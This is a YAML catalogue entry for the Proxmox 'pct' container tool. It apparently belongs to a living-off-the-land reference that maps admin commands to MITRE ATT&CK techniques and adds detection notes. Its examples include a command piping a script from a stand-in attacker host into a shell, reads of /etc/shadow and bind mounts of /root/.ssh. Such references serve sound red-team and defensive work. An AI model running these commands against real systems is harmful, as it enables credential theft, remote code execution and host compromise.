---
Name: pct
Description: pct (Proxmox Container Toolkit) is the command-line tool for managing LXC containers in Proxmox VE. It provides container lifecycle management including creation, configuration, and execution. Adversaries can leverage pct to spawn privileged containers for host escape, execute commands in existing containers, and manipulate container configurations for persistence.
Author: 'ZephrFish'
Created: 2025-12-06
Commands:
  - Command: pct list
    Description: Lists all LXC containers on the current node with their CTID, status, lock, and name.
    Usecase: Enumerate all containers to identify targets for lateral movement or host escape vectors.
    Category: discovery
    Privileges: Administrator
    MitreID: T1082
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pct list
      - pct list | grep running

  - Command: pct config {ctid}
    Description: Display full configuration of a container including mount points, networking, and privileges.
    Usecase: Identify privileged containers or containers with host filesystem access that can be exploited.
    Category: discovery
    Privileges: Administrator
    MitreID: T1082
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pct config 100
      - pct config 100 | grep -E "mount|features|unprivileged"

  - Command: pct exec {ctid} -- command
    Description: Execute arbitrary commands inside a running container.
    Usecase: Lateral movement by executing commands in containers without authentication.
    Category: execution
    Privileges: Administrator
    MitreID: T1059
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pct exec 100 -- cat /etc/shadow
      - pct exec 100 -- /bin/bash -c "whoami && id"
      - pct exec 100 -- /bin/sh -c "curl http://attacker.com/shell.sh | sh"
    Tags:
      - Lateral Movement
      - Container Escape

  - Command: pct enter {ctid}
    Description: Open an interactive shell session inside a container.
    Usecase: Gain interactive access to a container for manual reconnaissance or exploitation.
    Category: execution
    Privileges: Administrator
    MitreID: T1059
    OperatingSystem: Proxmox VE

  - Command: pct push {ctid} localfile remotefile
    Description: Copy a file from the host into a container.
    Usecase: Deploy malware, backdoors, or tools into containers for lateral movement.
    Category: execution
    Privileges: Administrator
    MitreID: T1105
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pct push 100 /tmp/payload.sh /tmp/payload.sh

  - Command: pct pull {ctid} remotefile localfile
    Description: Copy a file from a container to the host.
    Usecase: Exfiltrate sensitive data from containers including credentials and configuration files.
    Category: collection
    Privileges: Administrator
    MitreID: T1005
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pct pull 100 /etc/shadow /tmp/shadow.txt

  - Command: pct snapshot {ctid} {snapname}
    Description: Create a snapshot of a container.
    Usecase: Snapshot containers before manipulation for potential rollback or offline analysis.
    Category: collection
    Privileges: Administrator
    MitreID: T1074.001
    OperatingSystem: Proxmox VE

  - Command: pct set {ctid} -mp0 /host/path,mp=/container/path
    Description: Add a bind mount from host filesystem to container.
    Usecase: Mount sensitive host directories into containers for privilege escalation or data access.
    Category: privilege escalation
    Privileges: Administrator
    MitreID: T1611
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pct set 100 -mp0 /etc,mp=/mnt/host-etc
      - pct set 100 -mp0 /root/.ssh,mp=/mnt/ssh-keys
    Tags:
      - Container Escape
      - Privilege Escalation

  - Command: pct set {ctid} --features nesting=1,keyctl=1
    Description: Enable container nesting and keyctl features.
    Usecase: Enable features required for running Docker inside containers or accessing kernel keyrings.
    Category: configuration
    Privileges: Administrator
    MitreID: T1548
    OperatingSystem: Proxmox VE

  - Command: pct stop {ctid}
    Description: Stop a running container.
    Usecase: Impact by shutting down containers hosting critical services.
    Category: impact
    Privileges: Administrator
    MitreID: T1529
    OperatingSystem: Proxmox VE

  - Command: pct destroy {ctid}
    Description: Permanently destroy a container and its data.
    Usecase: Destructive impact by permanently deleting containers.
    Category: impact
    Privileges: Administrator
    MitreID: T1485
    OperatingSystem: Proxmox VE

  - Command: pct create {ctid} template.tar.gz --hostname backdoor --rootfs local:8
    Description: Create a new container from a template.
    Usecase: Spawn a malicious container for persistence or as a pivot point.
    Category: persistence
    Privileges: Administrator
    MitreID: T1610
    OperatingSystem: Proxmox VE

Full_Path:
  - Path: /usr/sbin/pct

Detection:
  - Note: Monitor /var/log/pve/tasks/* for pct exec commands
  - Note: Watch for privileged container creation or feature changes
  - Note: Alert on bind mounts to sensitive host directories

Resources:
  - Link: https://pve.proxmox.com/pve-docs/pct.1.html
  - Link: https://pve.proxmox.com/wiki/Linux_Container
  - Link: https://pve.proxmox.com/wiki/Unprivileged_LXC_containers

Acknowledgement:
  - Person: ZephrFish
    Handle: '@ZephrFish'
---
